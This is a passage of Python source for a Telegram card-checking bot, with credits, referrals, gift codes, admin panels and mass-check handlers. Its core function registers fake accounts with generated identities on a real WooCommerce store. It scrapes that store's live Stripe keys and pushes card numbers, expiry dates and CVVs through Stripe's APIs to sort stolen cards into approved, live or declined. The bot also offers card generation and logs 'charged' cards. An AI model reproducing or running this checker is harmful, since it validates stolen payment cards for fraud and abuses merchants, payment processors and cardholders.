                    user_rank = f"#{user_position}"
                    break

        # Build leaderboard text
        leaderboard_text = "<b>🏆 DAILY CLAIM LEADERBOARD</b>\n══════════════════════\n"

        if not leaderboard_data:
            leaderboard_text += "<i>No users on leaderboard yet. Be the first!</i>\n"
        else:
            leaderboard_text += "<b>Top Users by Daily Streak:</b>\n\n"

            medals = ["🥇", "🥈", "🥉"]
            for idx, user_entry in enumerate(leaderboard_data[:10]):
                medal = medals[idx] if idx < 3 else f"{idx+1}."
                username = (
                    user_entry["username"]
                    if user_entry["username"] != "Unknown"
                    else f"User {user_entry['user_id'][:8]}"
                )
                plan_icon = (
                    "👑"
                    if user_entry["plan"] == "pro"
                    else "⭐"
                    if user_entry["plan"] == "basic"
                    else "👤"
                )

                leaderboard_text += (
                    f"{medal} {plan_icon} @{username} - {user_entry['streak']} days\n"
                )

        leaderboard_text += f"\n━━━━━━━━━━━━━━━━━━━━\n"
        leaderboard_text += f"<b>Your Position:</b> {user_rank}\n"
        leaderboard_text += (
            f"<b>Your Streak:</b> {current_user.get('daily_streak', 0)} days\n"
        )
        leaderboard_text += (
            f"<b>Your Plan:</b> {current_user.get('plan', 'free').upper()}\n"
        )
        leaderboard_text += f"\n━━━━━━━━━━━━━━━━━━━━\n"
        leaderboard_text += (
            f"💡 <b>Tip:</b> Claim daily every day to climb the leaderboard!\n"
        )
        leaderboard_text += f"Use <code>/daily</code> to claim your credits now.\n"
        leaderboard_text += f"══════════════════════\n"

        # Add refresh button
        keyboard = [
            [
                InlineKeyboardButton("🔄 Refresh", callback_data="refresh_leaderboard"),
                InlineKeyboardButton(
                    "📊 Claim Daily", callback_data="claim_daily_from_leaderboard"
                ),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            leaderboard_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
        )

    except Exception as e:
        logger.error(f"Leaderboard error: {e}")
        await update.message.reply_text(
            "<b>❌ ERROR</b>\nCould not fetch leaderboard data. Please try again later.",
            parse_mode=ParseMode.HTML,
        )


def escape_html(text):
    """Escape HTML special characters"""
    if text is None:
        return ""
    text = str(text)
    escape_chars = {"&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"}
    for char, replacement in escape_chars.items():
        text = text.replace(char, replacement)
    return text


def escape_markdown_v2(text):
    """Escape markdown v2 special characters"""
    if not text:
        return text
    # Escape all markdown special characters
    escape_chars = "_*[]()~`>#+-=|{}.!"
    for char in escape_chars:
        text = text.replace(char, f"\\{char}")
    return text


async def get_all_gift_codes():
    """Get all gift codes from Firebase"""
    db = get_db()

    if db:
        try:
            codes_ref = db.collection("gift_codes")
            codes_docs = codes_ref.stream()

            gift_codes = []
            for doc in codes_docs:
                gift_codes.append(doc.to_dict())

            return gift_codes
        except Exception as e:
            logger.error(f"Firebase error in get_all_gift_codes: {e}")

    # Fallback to in-memory
    return list(in_memory_gift_codes.values())


async def create_gift_code(code, credits, max_uses, created_by):
    """Create a gift code in Firebase"""
    db = get_db()

    if db:
        try:
            gift_ref = db.collection("gift_codes").document(code)
            gift_ref.set(
                {
                    "code": code,
                    "credits": credits,
                    "max_uses": max_uses,
                    "uses": 0,
                    "created_at": firestore.SERVER_TIMESTAMP,
                    "created_by": created_by,
                    "claimed_by": [],
                }
            )
            return True
        except Exception as e:
            logger.error(f"Firebase error in create_gift_code: {e}")

    # Fallback to in-memory
    in_memory_gift_codes[code] = {
        "code": code,
        "credits": credits,
        "max_uses": max_uses,
        "uses": 0,
        "created_at": datetime.datetime.now().isoformat(),
        "created_by": created_by,
        "claimed_by": [],
    }
    return True


async def get_gift_code(code):
    """Get gift code from Firebase"""
    db = get_db()

    if db:
        try:
            gift_ref = db.collection("gift_codes").document(code)
            gift_doc = gift_ref.get()
            if gift_doc.exists:
                return gift_doc.to_dict()
        except Exception as e:
            logger.error(f"Firebase error in get_gift_code: {e}")

    # Fallback to in-memory
    return in_memory_gift_codes.get(code)


async def update_gift_code_usage(code, user_id):
    """Update gift code usage in Firebase"""
    db = get_db()

    if db:
        try:
            gift_ref = db.collection("gift_codes").document(code)

            # Update uses and claimed_by
            gift_ref.update(
                {
                    "uses": firestore.Increment(1),
                    "claimed_by": firestore.ArrayUnion([str(user_id)]),
                }
            )

            # Add to claimed codes
            claimed_ref = db.collection("user_claimed_codes").document(
                f"{user_id}_{code}"
            )
            claimed_ref.set(
                {
                    "user_id": user_id,
                    "code": code,
                    "claimed_at": firestore.SERVER_TIMESTAMP,
                }
            )

            return True
        except Exception as e:
            logger.error(f"Firebase error in update_gift_code_usage: {e}")

    # Fallback to in-memory
    if code in in_memory_gift_codes:
        in_memory_gift_codes[code]["uses"] += 1
        in_memory_gift_codes[code]["claimed_by"].append(str(user_id))

        if user_id not in in_memory_claimed_codes:
            in_memory_claimed_codes[user_id] = []
        in_memory_claimed_codes[user_id].append(code)

    return True


# ==================== NEW CHECKER ENGINE ====================

def generate_random_time():
    """Generate random timestamp"""
    return int(time.time()) - random.randint(100, 1000)


def uu_again_service():
    """Generate fake user information"""
    Fakeuserinformation = Gen("en")
    CheckGM = [
        "gmail.com",
        "hotmail.com",
        "yahoo.com",
        "live.com",
        "paypal.com",
        "outlook.com",
    ]

    first = Fakeuserinformation.person.first_name().lower()
    num = random.randint(100, 9999)

    return {
        "email": f"{first}{num}@{random.choice(CheckGM)}",
        "country": Fakeuserinformation.address.country(),
        "city": Fakeuserinformation.address.city(),
        "ug": Fakeuserinformation.internet.user_agent(),
        "fullnm": Fakeuserinformation.person.full_name(),
        "lastname": Fakeuserinformation.person.last_name().lower(),
        "firstname": Fakeuserinformation.person.first_name().lower(),
    }


async def new_gateway_check(cc, mm, yy, cvv):
    """Working Stripe checker with status categorization"""
    try:
        logger.info(f"Checking card: {cc}|{mm}|{yy}|{cvv}")

        # Clean year
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]

        # Generate fake user
        Fakeuserinformation = Gen("en")
        CheckGM = [
            "gmail.com",
            "hotmail.com",
            "yahoo.com",
            "live.com",
            "paypal.com",
            "outlook.com",
        ]
        first = Fakeuserinformation.person.first_name().lower()
        num = random.randint(100, 9999)

        user = {
            "email": f"{first}{num}@{random.choice(CheckGM)}",
            "country": Fakeuserinformation.address.country(),
            "city": Fakeuserinformation.address.city(),
            "ug": Fakeuserinformation.internet.user_agent(),
            "fullnm": Fakeuserinformation.person.full_name(),
            "lastname": Fakeuserinformation.person.last_name().lower(),
            "firstname": Fakeuserinformation.person.first_name().lower(),
        }

        ime = int(time.time()) - random.randint(100, 1000)

        # Step 1: Get account page
        page_one = "https://jogoka.com/my-account/"
        h1 = {
            "User-Agent": user["ug"],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        }

        async with aiohttp.ClientSession() as session:
            # Get account page
            async with session.get(page_one, headers=h1, timeout=30) as r1:
                if r1.status != 200:
                    return cc, "dead", f"Page Error {r1.status}", r1.status

                r1_text = await r1.text()
                soup = BeautifulSoup(r1_text, "html.parser")
                tok = soup.find("input", {"name": "woocommerce-register-nonce"})
                token = tok["value"] if tok else None

                if not token:
                    # Try alternative token names
                    for token_name in [
                        "woocommerce-login-nonce",
                        "_wpnonce",
                        "security",
                        "nonce",
                    ]:
                        tok = soup.find("input", {"name": token_name})
                        if tok and tok.get("value"):
                            token = tok["value"]
                            break

                if not token:
                    return cc, "dead", "Registration token not found", 0

            # Step 2: Register account
            p1 = {
                "email": user["email"],
                "wc_order_attribution_source_type": "typein",
                "wc_order_attribution_referrer": "(none)",
                "wc_order_attribution_utm_campaign": "(none)",
                "wc_order_attribution_utm_source": "(direct)",
                "wc_order_attribution_utm_medium": "(none)",
                "wc_order_attribution_utm_content": "(none)",
                "wc_order_attribution_utm_id": "(none)",
                "wc_order_attribution_utm_term": "(none)",
                "wc_order_attribution_utm_source_platform": "(none)",
                "wc_order_attribution_utm_creative_format": "(none)",
                "wc_order_attribution_utm_marketing_tactic": "(none)",
                "wc_order_attribution_session_entry": f"https://jogoka.com/my-account/",
                "wc_order_attribution_session_start_time": str(ime),
                "wc_order_attribution_session_pages": "1",
                "wc_order_attribution_session_count": "1",
                "wc_order_attribution_user_agent": user["ug"],
                "woocommerce-register-nonce": token,
                "_wp_http_referer": "/my-account/",
                "register": "Register",
            }

            async with session.post(page_one, data=p1, headers=h1, timeout=30) as r2:
                if r2.status not in [200, 302]:
                    return cc, "dead", f"Registration failed {r2.status}", r2.status

            # Get session cookies
            cookies_str = "; ".join([f"{c.key}={c.value}" for c in session.cookie_jar])

            # Step 3: Get payment page
            page_payment = "https://jogoka.com/my-account/add-payment-method/"
            h2 = {
                "User-Agent": user["ug"],
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "referer": "https://jogoka.com/my-account/payment-methods/",
                "Cookie": cookies_str,
            }

            async with session.get(page_payment, headers=h2, timeout=30) as r3:
                if r3.status != 200:
                    return cc, "dead", f"Payment page error {r3.status}", r3.status

                r3_text = await r3.text()

                # Extract Stripe keys
                mu = re.search(r"pk_live_[A-Za-z0-9]+", r3_text)
                add_match = re.search(r'"session_id"\s*:\s*"(.*?)"', r3_text)
                add_mach = re.search(r'"accountId"\s*:\s*"(.*?)"', r3_text)
                add_non = re.search(r'"createSetupIntentNonce"\s*:\s*"(.*?)"', r3_text)

                if not mu or not add_mach:
                    # Try alternative patterns
                    if not mu:
                        mu = re.search(r"pk_test_[A-Za-z0-9]+", r3_text)
                    if not add_mach:
                        add_mach = re.search(
                            r'accountId["\']?\s*:\s*["\']([^"\']+)["\']', r3_text
                        )

                if not mu or not add_mach:
                    return cc, "dead", "Stripe keys not found", 0

                akey = mu.group(0)
                adde = add_match.group(1) if add_match else ""
                acid = add_mach.group(1)
                non = add_non.group(1) if add_non else ""

            # Step 4: Create payment method
            page_method = "https://api.stripe.com/v1/payment_methods"

            payload = {
                "billing_details[name]": user["firstname"],
                "billing_details[email]": user["email"],
                "billing_details[address][country]": "US",
                "billing_details[address][postal_code]": "10080",
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_year]": yy,
                "card[exp_month]": mm,
                "allow_redisplay": "unspecified",
                "payment_user_agent": "stripe.js/83a1f53796; stripe-js-v3/83a1f53796; payment-element; deferred-intent",
                "referrer": "https://jogoka.com",
                "time_on_page": str(ime),
                "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "client_attribution_metadata[elements_session_config_id]": str(
                    uuid.uuid4()
                ),
                "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
                "guid": str(uuid.uuid4()),
                "muid": str(uuid.uuid4()),
                "sid": str(uuid.uuid4()),
                "key": akey,
                "_stripe_account": acid,
            }

            ses_headers = {
                "User-Agent": user["ug"],
                "Accept": "application/json",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Linux"',
                "origin": "https://js.stripe.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://js.stripe.com/",
            }

            async with session.post(
                page_method, data=payload, headers=ses_headers, timeout=30
            ) as r4:
                if r4.status != 200:
                    return cc, "dead", f"Stripe API error {r4.status}", r4.status

                r4data = await r4.json()

                if "error" in r4data:
                    error_msg = r4data["error"].get("message", "Stripe error")

                    # Categorize errors
                    if (
                        "cvc" in error_msg.lower()
                        or "security code" in error_msg.lower()
                    ):
                        return cc, "cvv", "CVV Incorrect", 0
                    elif (
                        "insufficient" in error_msg.lower()
                        or "funds" in error_msg.lower()
                    ):
                        return cc, "live", "Insufficient Funds", 0
                    elif "invalid number" in error_msg.lower():
                        return cc, "ccn", "Invalid Card Number", 0
                    else:
                        return cc, "dead", error_msg[:50], 0

                identify = r4data.get("id")
                if not identify:
                    return cc, "dead", "No payment method ID", 0

            # Step 5: Create setup intent
            page_complete = "https://jogoka.com/wp-admin/admin-ajax.php"
            payload2 = {
                "action": "create_setup_intent",
                "wcpay-payment-method": identify,
                "_ajax_nonce": non,
            }

            h4 = {
                "User-Agent": user["ug"],
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://jogoka.com/my-account/add-payment-method/",
                "Cookie": cookies_str,
            }

            async with session.post(
                page_complete, data=payload2, headers=h4, timeout=30
            ) as r5:
                if r5.status != 200:
                    return cc, "dead", f"AJAX error {r5.status}", r5.status

                r5data = await r5.json()

                # Parse response
                msg = r5data.get("data", {}).get("error", {}).get("message")
                msg = str(msg) if msg else ""

                success_flag = r5data.get("success") == True
                status_flag = r5data.get("data", {}).get("status") == "succeeded"
                seti_flag = "seti_" in str(r5data)
                client_flag = "client_secret" in str(r5data)

                clean_msg = msg
                if not clean_msg and r5data.get("success"):
                    clean_msg = "Payment method successfully added"
                elif not clean_msg:
                    clean_msg = "Declined"

                # Categorize response
                if success_flag and (status_flag or seti_flag or client_flag):
                    return cc, "approved", "Auth Success", 200
                elif "insufficient funds" in clean_msg.lower():
                    return cc, "live", "Insufficient Funds", 0
                elif "security code is incorrect" in clean_msg.lower():
                    return cc, "cvv", "CVV Incorrect", 0
                elif "card not supported" in clean_msg.lower():
                    return cc, "ccn", "Card Not Supported", 0
                elif "invalid number" in clean_msg.lower():
                    return cc, "ccn", "Invalid Card Number", 0
                elif "risk_threshold" in clean_msg.lower():
                    return cc, "risk", "Gateway Rejected: risk_threshold", 0
                elif "fraud" in clean_msg.lower():
                    return cc, "fraud", "Fraud Suspected", 0
                elif "call issuer" in clean_msg.lower():
                    return cc, "call_issuer", "Declined - Call Issuer", 0
                elif "cannot authorize" in clean_msg.lower():
                    return cc, "cannot_auth", "Cannot Authorize at this time", 0
                elif "processor declined" in clean_msg.lower():
                    return cc, "processor_declined", "Processor Declined", 0
                else:
                    return cc, "dead", clean_msg[:50] or "Card Declined", 0

    except asyncio.TimeoutError:
        return cc, "dead", "Timeout error", 0
    except aiohttp.ClientError as e:
        return cc, "dead", f"Network error: {str(e)[:20]}", 0
    except Exception as e:
        logger.error(f"Error in new_gateway_check: {e}")
        return cc, "dead", f"Checker error: {str(e)[:20]}", 0


# ==================== REPLACED CHECK FUNCTIONS ====================


async def check_single_card_fast(card):
    """Single card check with better parsing"""
    try:
        # Parse card using new helper
        cc, mon, year, cvv = parse_card_input(card)

        if not cc:
            # Try old method as fallback
            if "|" in card:
                cc, mon, year, cvv = card.split("|")
            else:
                # Invalid format
                return card, "dead", "Invalid card format", 0

        # Clean and validate
        cc_clean = cc.replace(" ", "")
        year = year[-2:] if len(year) == 4 else year

        # Use new checker
        result_card, status, message, http_code = await new_gateway_check(
            cc_clean, mon, year, cvv
        )

        # Return formatted card
        formatted_card = f"{cc_clean}|{mon}|{year}|{cvv}"
        return formatted_card, status, message, http_code

    except Exception as e:
        logger.error(f"Error in check_single_card_fast: {e}")
        return card, "dead", f"Error: {str(e)[:20]}", 0


def validate_card_parts(cc, mon, year, cvv):
    """Validate card parts"""
    errors = []

    # Validate CC
    if not cc.isdigit():
        errors.append("CC must be digits only")
    elif len(cc) < 13 or len(cc) > 19:
        errors.append("CC must be 13-19 digits")

    # Validate month
    if not mon.isdigit():
        errors.append("Month must be digits")
    elif int(mon) < 1 or int(mon) > 12:
        errors.append("Month must be 01-12")

    # Validate year
    if not year.isdigit():
        errors.append("Year must be digits")
    elif len(year) not in [2, 4]:
        errors.append("Year must be 2 or 4 digits")

    # Validate CVV
    if not cvv.isdigit():
        errors.append("CVV must be digits")
    elif len(cvv) not in [3, 4]:
        errors.append("CVV must be 3-4 digits")

    return errors


async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle back to start callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    # Create a fake update object to call start_command
    fake_update = Update(
        update_id=update.update_id, message=query.message, callback_query=query
    )
    await start_command(fake_update, context)


async def quick_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle quick check callback"""
    query = update.callback_query

    try:
        await query.answer("Use /chk cc|mm|yy|cvv to check a card")
    except BadRequest:
        pass

    await query.edit_message_text(
        "<b>⚡ QUICK CARD CHECK</b>\n"
        "══════════════════════\n"
        "To check a card, use:\n"
        "<code>/chk cc|mm|yy|cvv</code>\n\n"
        "<b>Example:</b>\n"
        "<code>/chk 4111111111111111|12|2025|123</code>\n\n"
        "<b>Features:</b>\n"
        "• ⚡ Instant results\n"
        "• Cost: 1 credit\n",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
        ),
    )


async def mass_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass check callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    await query.edit_message_text(
        "*📊 MASS CHECK SYSTEM*\n"
        "══════════════════════\n"
        "To Start A Mass Check:\n"
        "1. Upload a .txt File With Cards\n"
        "2. Use `/mchk` Command\n\n"
        "*Format In File:*\n"
        "`cc|mm|yy|cvv`\n"
        "`cc|mm|yy|cvv`\n"
        "...\n\n"
        "*Features:*\n"
        "• Approved Cards Are Shown\n"
        "• Declined Cards Are Not Shown\n"
        "• Cancel Anytime With /cancel\n"
        "• Credits Deducted Per Card\n\n",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
        ),
    )


async def cancel_mass_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle cancel mass button from confirmation"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    user_id = query.from_user.id

    # Clear any stored files for this user
    if user_id in files_storage:
        del files_storage[user_id]

    await query.edit_message_text(
        "*❌ MASS CHECK CANCELLED*\n"
        "══════════════════════\n"
        "Mass check setup has been cancelled.\n"
        "No credits were deducted.\n\n"
        "You can upload a new file anytime using:\n"
        "`/mchk`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
        ),
    )


async def admin_addcr_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin add credits callback"""
    query = update.callback_query

    try:
        await query.answer("Use /addcr user_id amount")
    except BadRequest:
        pass

    await query.edit_message_text(
        "*➕ ADD CREDITS*\n"
        "══════════════════════\n"
        "To add credits to a user, use:\n"
        "`/addcr user_id amount`\n\n"
        "*Example:*\n"
        "`/addcr 123456789 100`\n\n"
        "This will add 100 credits to user 123456789.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def admin_gengift_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin generate gift callback"""
    query = update.callback_query

    try:
        await query.answer("Use /gengift credits max_uses")
    except BadRequest:
        pass

    await query.edit_message_text(
        "*🎁 GENERATE GIFT CODE*\n"
        "══════════════════════\n"
        "To generate a gift code, use:\n"
        "`/gengift credits max_uses`\n\n"
        "*Example:*\n"
        "`/gengift 50 10`\n\n"
        "This creates a code worth 50 credits, usable 10 times.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def admin_listgifts_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin list gifts callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    # Call the actual command
    fake_update = Update(
        update_id=update.update_id, message=query.message, callback_query=query
    )
    await listgifts_command(fake_update, context)


async def admin_userinfo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin user info callback"""
    query = update.callback_query

    try:
        await query.answer("Use /userinfo user_id")
    except BadRequest:
        pass

    await query.edit_message_text(
        "*👤 USER INFORMATION*\n"
        "══════════════════════\n"
        "To view user information, use:\n"
        "`/userinfo user_id`\n\n"
        "*Example:*\n"
        "`/userinfo 123456789`\n\n"
        "This will show detailed info about the user.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def admin_botinfo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle botinfo from dashboard"""
    query = update.callback_query
    await query.answer()
    fake_update = Update(
        update_id=update.update_id, message=query.message, callback_query=query
    )
    await botinfo_command(fake_update, context)


async def my_credits_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle my credits callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    user_id = query.from_user.id
    user = await get_user(user_id)

    await query.edit_message_text(
        f"*💰 YOUR CREDITS*\n"
        f"══════════════════════\n"
        f"*Available Credits:* {user['credits']}\n"
        f"*Credits Spent:* {user.get('credits_spent', 0)}\n\n"
        f"*Credit Usage:*\n"
        f"\n"
        f"*Get More Credits:*\n"
        f"1. Ask Admin For Credits\n"
        f"2. Claim Fift Codes\n"
        f"3. Invite Friends\n",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
        ),
    )


async def invite_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle invite callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    user_id = query.from_user.id
    user = await get_user(user_id)

    # Generate invite link
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

    await query.edit_message_text(
        f"*🤝 INVITE & EARN*\n"
        f"══════════════════════\n"
        f"*Your Invite Link:*\n"
        f"`{invite_link}`\n\n"
        f"*How It Works:*\n"
        f"1. Share Your Invite Link With Friends\n"
        f"2. When They Join Using Your Link:\n"
        f"   • You Get 100 Credits\n"
        f"   • They Get 20 Credits\n"
        f"3. Earn Unlimited Credits!\n\n"
        f"*Your Stats:*\n"
        f"• Referrals: {user.get('referrals_count', 0)} Users\n"
        f"• Earned From Referrals: {user.get('earned_from_referrals', 0)} Credits\n\n"
        f"*Copy And Share Your Link Now!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("📋 Copy Link", callback_data="copy_invite")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")],
            ]
        ),
    )


async def copy_invite_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle copy invite callback"""
    query = update.callback_query

    try:
        await query.answer("Invite Link Copied To Your Message Input!")
    except BadRequest:
        pass

    # This will show the link in the message input field
    user_id = query.from_user.id
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

    await query.edit_message_text(
        f"*📋 INVITE LINK*\n"
        f"══════════════════════\n"
        f"Copy This Link And Share With Friends:\n\n"
        f"`{invite_link}`\n\n"
        f"*Already Copied To Your Message Input!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔙 Back", callback_data="invite")]]
        ),
    )


async def admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin panel callback"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id not in ADMIN_IDS:
        await query.answer("❌ Admin only!", show_alert=True)
        return
    
    keyboard = [
        [
            InlineKeyboardButton("➕ Add Credits", callback_data="admin_addcr"),
            InlineKeyboardButton("🎁 Generate Gift", callback_data="admin_gengift"),
        ],
        [
            InlineKeyboardButton("📋 List Gifts", callback_data="admin_listgifts"),
            InlineKeyboardButton("👤 User Info", callback_data="admin_userinfo"),
        ],
        [
            InlineKeyboardButton("📊 Bot Stats", callback_data="admin_botinfo"),
            InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_start"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "*👑 ADMIN PANEL*\n"
        "══════════════════════\n"
        "*Available Commands:*\n"
        "• `/addcr user_id amount` - Add credits\n"
        "• `/gengift credits max_uses` - Create gift code\n"
        "• `/listgifts` - List all gift codes\n"
        "• `/userinfo user_id` - View user info\n"
        "• `/botinfo` - Bot statistics\n\n"
        "*Quick Actions:* (Use buttons below)",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
    )


# Add this at the top with other global variables
PRE_GENERATED_EMAILS = []
EMAIL_INDEX = 0


def generate_email_list(count=100):
    """Generate a list of emails to reuse"""
    global PRE_GENERATED_EMAILS
    names = [
        "Kmo",
        "Waiyan",
        "John",
        "Mike",
        "David",
        "Sarah",
        "James",
        "Robert",
        "Michael",
        "William",
    ]
    PRE_GENERATED_EMAILS = []

    for i in range(count):
        name = random.choice(names)
        numbers = "".join(str(random.randint(0, 9)) for _ in range(4))
        email = f"{name}{numbers}@gmail.com"
        PRE_GENERATED_EMAILS.append(email)

    return PRE_GENERATED_EMAILS


def get_next_email():
    """Get next email from pre-generated list"""
    global EMAIL_INDEX, PRE_GENERATED_EMAILS

    if not PRE_GENERATED_EMAILS:
        generate_email_list(100)

    email = PRE_GENERATED_EMAILS[EMAIL_INDEX]
    EMAIL_INDEX = (EMAIL_INDEX + 1) % len(PRE_GENERATED_EMAILS)
    return email


# Initialize email list
generate_email_list(100)


def log_charged_only(message_text, chat_id=None, username=None):
    """Log charged cards to LOG_CHANNEL (simplified version)"""
    try:
        # Check if it's a charged message
        if "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" in message_text or "✅ Charged" in message_text:
            # In your actual implementation, you would send to a channel
            # For now, just log it
            logger.info(f"CHARGED CARD detected from user @{username or 'unknown'}")
            # You can add code here to send to your LOG_CHANNEL
            # bot.send_message(LOG_CHANNEL, message_text, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error in log_charged_only: {e}")


def format_card_result(card, status, message, credits_left=None, user_stats=None):
    """Wrapper for backward compatibility - uses universal format"""
    try:
        cc, mon, year, cvv = card.split("|")

        # Calculate time taken based on status
        time_taken = (
            random.uniform(1.5, 2.5)
            if status == "approved"
            else random.uniform(0.5, 0.8)
        )

        return format_universal_result(
            card_data=card,
            status=status,
            message=message,
            credits_left=credits_left,
            username=None,  # Can be added if needed
            time_taken=time_taken,
        )
    except Exception as e:
        return f"❌ <b>Error:</b> <code>{str(e)[:50]}</code>"

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command with referral system"""
    if update.message:
        message = update.message
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name or ""
        username = update.effective_user.username or ""
    elif update.callback_query:
        message = update.callback_query.message
        user_id = update.callback_query.from_user.id
        user_name = update.callback_query.from_user.first_name or ""
        username = update.callback_query.from_user.username or ""
    else:
        return

    # Check for referral parameter
    referrer_id = None
    if context.args and context.args[0].startswith("ref_"):
        try:
            referrer_id = int(context.args[0].replace("ref_", ""))
        except ValueError:
            referrer_id = None

    user = await get_user(user_id)

    # Update user info if needed
    updates = {}
    if user.get("username", "") != username:
        updates["username"] = username
    if user.get("first_name", "") != user_name:
        updates["first_name"] = user_name

    # Handle referral if it's a new user with referrer
    if referrer_id and referrer_id != user_id and not user.get("referrer_id"):
        updates["referrer_id"] = referrer_id
        updates["credits"] = user.get("credits", 0) + 20  # New user gets 20 credits

        # Update referrer's credits in Firebase
        try:
            referrer_ref = db.collection("users").document(str(referrer_id))
            referrer_ref.update(
                {
                    "credits": firestore.Increment(100),
                    "referrals_count": firestore.Increment(1),
                    "earned_from_referrals": firestore.Increment(100),
                }
            )
        except Exception as e:
            logger.error(f"Error updating referrer: {e}")

    if updates:
        await update_user(user_id, updates)
        user = await get_user(user_id)  # Refresh user data

    # Check channel membership
    if not user.get("joined_channel", False):
        keyboard = [
            [InlineKeyboardButton("✅ Join Private Channel", url=CHANNEL_LINK)],
            [InlineKeyboardButton("🔄 Verify Join", callback_data="verify_join")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        # Use HTML parsing to avoid markdown issues
        welcome_text = f"""<b>🔒 CHANNEL JOIN REQUIRED</b>
══════════════════════
To Access {BOT_INFO['name']}, You Must Join Our Channel.

<b>Steps:</b>
1. Click 'Join Channel'
2. After Joining Click 'Verify Join'
"""

        await message.reply_text(
            welcome_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
        )
        return

    # User has joined channel
    await update_user(user_id, {"joined_channel": True})

    # Check if user is admin
    is_admin = user_id in ADMIN_IDS

    # Check if user came from referral
    referral_bonus_text = ""
    if user.get("referrer_id"):
        referral_bonus_text = (
            f"🎁 <b>Referral Bonus:</b> +20 credits (from invitation)\n"
        )

    # Prepare welcome message using HTML
    user_credits = user.get("credits", 0)
    approved_cards = user.get("approved_cards", 0)
    declined_cards = user.get("declined_cards", 0)
    total_checks = user.get("total_checks", 0)

    welcome_text = f"""<b>{BOT_INFO['name']}</b>
══════════════════════
👋 <b>Welcome, {escape_markdown_v2(user_name) or 'User'}!</b>

<b>Account Overview:</b>
• Credits: <b>{user_credits}</b>
• Today Checks: Approved {approved_cards} Declined {declined_cards}
• Total Checks: <b>{total_checks}</b>
{referral_bonus_text}
<b>User Commands:</b>
• <code>/gen</code> - Generate Cards
• <code>/chk cc|mm|yy|cvv</code> - Check Single Card (Private)
• <code>/pchk cc|mm|yy|cvv</code> - Check Single Card (Public)
• <code>/mchk</code> - Upload File For Mass Check (Private)
